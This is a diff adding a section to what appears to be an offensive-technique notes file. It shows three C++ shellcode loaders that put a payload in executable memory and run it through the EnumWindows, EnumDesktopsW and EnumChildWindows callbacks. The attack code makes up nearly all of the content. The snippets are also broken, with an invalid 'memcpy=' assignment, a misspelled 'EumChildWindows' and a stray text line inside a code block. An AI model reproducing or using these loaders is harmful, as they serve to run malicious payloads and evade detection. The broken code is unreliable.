@@ -177,5 +177,69 @@ executor.exe*  shellcode.cpp
 
 ---
 
+---
+
+
+---
+
+## Enum Functions to Execute Shellcode
+#### EnumWindows
+```cpp
+c++ code...
+#include <windows.h>
+#include <stdio.h>
+
+int main(int argc, char *argv[]) {
+	char shellcode[] = "your-boy-shellcode-here";
+
+	HANDLE hAlloc = VirtualAlloc(NULL, sizeof(shellcode), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
+	memcpy=(hAlloc, shellcode, sizeof(shellcode));
+	EnumWindows((WNDENUMPROC)hAlloc, NULL);
+}
+```
+
+---
+#### EnumDesktopsW
+
+```cpp
+#include <windows.h>
+#include <stdio.h>
+
+int main(int argc, char *argv[]) {
+	char shellcode[] = "your-boy-shellcode-here";
+
+	HANDLE hAlloc = VirtualAlloc(NULL, sizeof(shellcode), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
+	memcpy=(hAlloc, shellcode, sizeof(shellcode));
+	EnumDesktopsW(GetProcessWindowStation(),(DESKTOPENUMPROCW) hAlloc, NULL);
+}
+```
+
+---
+
+#### EnumChildWindows
+
+```cpp
+#include <windows.h>
+#include <stdio.h>
+
+int main(int argc, char *argv[]) {
+	char shellcode[] = "your-boy-shellcode-here";
+
+	HANDLE hAlloc = VirtualAlloc(NULL, sizeof(shellcode), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
+	memcpy=(hAlloc, shellcode, sizeof(shellcode));
+	EumChildWindows((HWND) NULL,(WNDENUMPROC) hAlloc,NULL);
+}
+```
+
+---
+
+---
+
+---
+
+
+
+
+
 
 
